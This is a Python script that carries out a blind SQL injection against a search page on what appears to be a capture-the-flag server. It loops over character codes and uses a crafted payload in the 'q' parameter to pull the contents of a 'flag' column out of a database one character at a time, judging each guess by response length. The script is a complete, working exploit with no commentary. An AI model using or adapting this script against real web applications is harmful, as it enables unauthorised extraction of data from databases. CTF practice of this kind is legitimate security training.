import requests

result_data = []

for j in range(0, 5):
    result = ""
    print(f"Row: {j + 1}")

    for i in range(1, 30):
        found = False
        for ascii in range(32, 127):
            payload = (f"33333%' Or if(ascii(substr((select flag from flags limit {j},1),{i},1))={ascii},1,0) and '1%'='1")
            r = requests.get("http://ctf.segfaulthub.com:2984/spec5/search.php", params={"q": payload})

            if len(r.text) > 1000: 
                result += chr(ascii) 
                print(f"[{i}] {chr(ascii)} → Current Progress: {result}")
                found = True
                break

        if not found:
            print("End")
            break

    result_data.append(result)

for idx, name in enumerate(result_data, 1):
    print(f"{idx}. {name}")
